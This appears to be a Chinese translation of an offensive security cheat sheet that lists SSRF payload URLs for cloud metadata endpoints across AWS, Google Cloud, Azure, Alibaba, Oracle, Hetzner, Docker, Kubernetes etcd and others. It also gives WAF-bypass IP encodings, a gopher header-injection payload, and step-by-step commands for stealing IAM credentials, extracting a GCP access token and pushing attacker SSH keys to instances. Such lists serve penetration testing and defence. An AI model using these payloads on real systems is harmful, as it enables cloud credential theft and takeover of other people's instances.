# SSRF URL 针对云实例

> 在云环境中利用服务器端请求伪造（SSRF）时，攻击者通常会针对元数据端点以检索敏感实例信息（例如凭据、配置）。以下是对各种云和基础设施提供商的常见URL进行分类的列表。

## 概要

* [AWS 存储桶的 SSRF URL](#ssrf-url-for-aws)
* [AWS ECS 的 SSRF URL](#ssrf-url-for-aws-ecs)
* [AWS Elastic Beanstalk 的 SSRF URL](#ssrf-url-for-aws-elastic-beanstalk)
* [AWS Lambda 的 SSRF URL](#ssrf-url-for-aws-lambda)
* [Google Cloud 的 SSRF URL](#ssrf-url-for-google-cloud)
* [Digital Ocean 的 SSRF URL](#ssrf-url-for-digital-ocean)
* [Packetcloud 的 SSRF URL](#ssrf-url-for-packetcloud)
* [Azure 的 SSRF URL](#ssrf-url-for-azure)
* [OpenStack/RackSpace 的 SSRF URL](#ssrf-url-for-openstackrackspace)
* [HP Helion 的 SSRF URL](#ssrf-url-for-hp-helion)
* [Oracle Cloud 的 SSRF URL](#ssrf-url-for-oracle-cloud)
* [Kubernetes ETCD 的 SSRF URL](#ssrf-url-for-kubernetes-etcd)
* [Alibaba 的 SSRF URL](#ssrf-url-for-alibaba)
* [Hetzner Cloud 的 SSRF URL](#ssrf-url-for-hetzner-cloud)
* [Docker 的 SSRF URL](#ssrf-url-for-docker)
* [Rancher 的 SSRF URL](#ssrf-url-for-rancher)
* [参考文献](#references)

## AWS 的 SSRF URL

AWS 实例元数据服务是在Amazon EC2实例内可用的服务，允许这些实例访问有关它们自己的元数据。- [文档](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)

* IPv4 端点（旧版）: `http://169.254.169.254/latest/meta-data/`
* IPv4 端点（新版本）需要头信息 `X-aws-ec2-metadata-token`

  ```powershell
  export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
  curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
  ```

* IPv6 端点: `http://[fd00:ec2::254]/latest/meta-data/`

在有WAF的情况下，你可能想尝试不同的方式来连接API。

* DNS记录指向AWS API IP

  ```powershell
  http://instance-data
  http://169.254.169.254
  http://169.254.169.254.nip.io/
  ```

* HTTP重定向

  ```powershell
  Static:http://nicob.net/redir6a
  Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
  ```

* 使用编码IP绕过WAF

  ```powershell
  http://425.510.425.510 Dotted decimal with overflow
  http://2852039166 Dotless decimal
  http://7147006462 Dotless decimal with overflow
  http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal
  http://0xA9FEA9FE Dotless hexadecimal
  http://0x41414141A9FEA9FE Dotless hexadecimal with overflow
  http://0251.0376.0251.0376 Dotted octal
  http://0251.00376.000251.0000376 Dotted octal with padding
  http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
  http://[::ffff:a9fe:a9fe] IPV6 Compressed
  http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded
  http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4
  http://[fd00:ec2::254] IPV6
  ```

这些URL返回与实例关联的IAM角色列表。然后你可以将角色名称附加到此URL以检索该角色的安全凭证。

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
```

此URL用于访问在启动实例时指定的用户数据。用户数据通常用于向实例传递启动脚本或其他配置信息。

```powershell
http://169.254.169.254/latest/user-data
```

其他URL用于查询有关实例的各种元数据，如主机名、公共IPv4地址和其他属性。

```powershell
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**示例**：

* Jira SSRF 导致 AWS 信息泄露 - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
* Flaws 挑战 - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`

## AWS ECS 的 SSRF URL

如果你在一个ECS实例上有一个具有文件系统访问权限的SSRF，请尝试提取`/proc/self/environ`以获取UUID。

```powershell
curl http://169.254.170.2/v2/credentials/<UUID>
```

这样你就可以提取附加角色的IAM密钥。

## AWS Elastic Beanstalk 的 SSRF URL

我们从API中检索`accountId`和`region`。

```powershell
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

然后我们从API中检索`AccessKeyId`、`SecretAccessKey`和`Token`。

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

然后我们使用这些凭据执行`aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`。

## AWS Lambda 的 SSRF URL

AWS Lambda 提供了一个HTTP API，用于自定义运行时从Lambda接收调用事件并在Lambda执行环境中发送响应数据。

```powershell
http://localhost:9001/2018-06-01/runtime/invocation/next
http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next
```

文档：[https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next)

## Google Cloud 的 SSRF URL

:warning: Google 将于1月15日停止支持对**v1元数据服务**的使用。

需要头信息“Metadata-Flavor: Google”或“X-Google-Metadata-Request: True”

```powershell
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Google 允许递归拉取

```powershell
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

Beta 版暂时不需要头信息（感谢Mathias Karlsson @avlidienbrunn）

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

可以通过gopher SSRF设置所需的头信息，使用以下技术

```powershell
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

有趣的文件可以提取：

* SSH 公共密钥: `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
* 获取访问令牌: `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
* Kubernetes 密钥: `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`

### 添加SSH密钥

提取令牌

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

检查令牌的作用域

```powershell
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```

现在推送SSH密钥。

```powershell
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

## Digital Ocean 的 SSRF URL

文档位于 `https://developers.digitalocean.com/documentation/metadata/`

```powershell
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

所有信息一次请求：
curl http://169.254.169.254/metadata/v1.json | jq
```

## Packetcloud 的 SSRF URL

文档位于 `https://metadata.packet.net/userdata`

## Azure 的 SSRF URL

有限，也许还有更多？ `https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`

```powershell
http://169.254.169.254/metadata/v1/maintenance
```

2017年4月更新，Azure 支持更多；需要头信息 "Metadata: true" `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`

```powershell
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

## OpenStack/RackSpace 的 SSRF URL

(是否需要头信息？未知)

```powershell
http://169.254.169.254/openstack
```

## HP Helion 的 SSRF URL

(是否需要头信息？未知)

```powershell
http://169.254.169.254/2009-04-04/meta-data/ 
```

## Oracle Cloud 的 SSRF URL

```powershell
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

## Alibaba 的 SSRF URL

```powershell
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

## Hetzner Cloud 的 SSRF URL

```powershell
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/instance-id
http://169.254.169.254/hetzner/v1/metadata/public-ipv4
http://169.254.169.254/hetzner/v1/metadata/private-networks
http://169.254.169.254/hetzner/v1/metadata/availability-zone
http://169.254.169.254/hetzner/v1/metadata/region
```

## Kubernetes ETCD 的 SSRF URL

可能包含API密钥和内部IP和端口

```powershell
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

## Docker 的 SSRF URL

```powershell
http://127.0.0.1:2375/v1.24/containers/json

简单示例
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

更多信息：

* 守护进程套接字选项: [https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option](https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option)
* Docker 引擎API: [https://docs.docker.com/engine/api/latest/](https://docs.docker.com/engine/api/latest/)

## Rancher 的 SSRF URL

```powershell
curl http://rancher-metadata/<version>/<path>
```

更多信息: [https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/](https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/)

## 参考文献

* [通过SSRF在Google收购中提取AWS元数据 - tghawkins - 2017年12月13日](https://web.archive.org/web/20180210093624/https://hawkinsecurity.com/2017/12/13/extracting-aws-metadata-via-ssrf-in-google-acquisition/)
* [利用AWS Elastic Beanstalk中的SSRF - Sunil Yadav - 2019年2月1日](https://notsosecure.com/exploiting-ssrf-aws-elastic-beanstalk)